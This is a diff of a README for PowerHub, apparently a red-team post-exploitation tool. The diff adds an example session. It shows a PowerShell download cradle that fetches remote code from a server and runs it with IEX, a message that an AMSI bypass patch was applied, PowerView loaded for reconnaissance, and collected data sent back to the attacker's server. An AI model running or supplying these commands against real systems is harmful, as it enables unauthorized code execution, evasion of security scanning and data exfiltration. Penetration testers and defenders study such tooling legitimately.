@@ -18,8 +18,24 @@ Your loot (Kerberos tickets, passwords, etc.) can be easily transferred back
 either as a file or a text snippet. PowerHub also helps with collaboration
 in case you're a small team.
 
-See it in action here:
+Here is a simple example (grab information about local groups with PowerView
+and transfer it back):
 
+```
+PS C:\Users\avollmer> $K=new-object net.webclient;$K.proxy=[Net.WebRequest]::GetSystemWebProxy();$K.Proxy.Credent
+ials=[Net.CredentialCache]::DefaultCredentials;IEX $K.downloadstring('http://192.168.11.2:8000/0');
+  _____   _____  _  _  _ _______  ______ _     _ _     _ ______
+ |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]
+ |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]
+                            written by Adrian Vollmer, 2018-2019
+Run 'Help-PowerHub' for help
+AmsiScanBuffer patch has been applied.
+0
+PS C:\Users\avollmer> lhm powerview
+[*] /ps1/PowerSploit/Recon/PowerView.ps1 imported.
+PS C:\Users\avollmer> Get-LocalGroup | ConvertTo-Json | Out-file groups.json
+PS C:\Users\avollmer> pth groups.json
+```
 
 ![PowerHub in action](https://github.com/AdrianVollmer/PowerHub/blob/master/img/inaction.png)
 
